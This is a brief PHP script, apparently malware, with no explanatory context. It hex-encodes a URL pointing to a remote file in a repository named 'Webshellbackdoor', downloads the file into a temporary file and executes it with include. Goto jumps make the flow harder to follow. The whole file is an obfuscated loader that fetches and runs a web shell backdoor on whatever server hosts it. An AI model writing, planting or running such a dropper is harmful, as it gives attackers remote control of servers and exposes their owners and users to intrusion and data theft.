<?php

goto Label1;
Label1: 
    $tempFile = tmpfile(); 
    $hexUrl = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f616c61726369646b2f5765627368656c6c6261636b646f6f722f6d61696e2f6179616e65332e706870"; 
    goto Label2;

Label2: 
    $url = hex2bin($hexUrl); 
    fwrite($tempFile, file_get_contents($url)); 
    goto Label3;

Label3: 
    include stream_get_meta_data($tempFile)["uri"]; 
    fclose($tempFile);
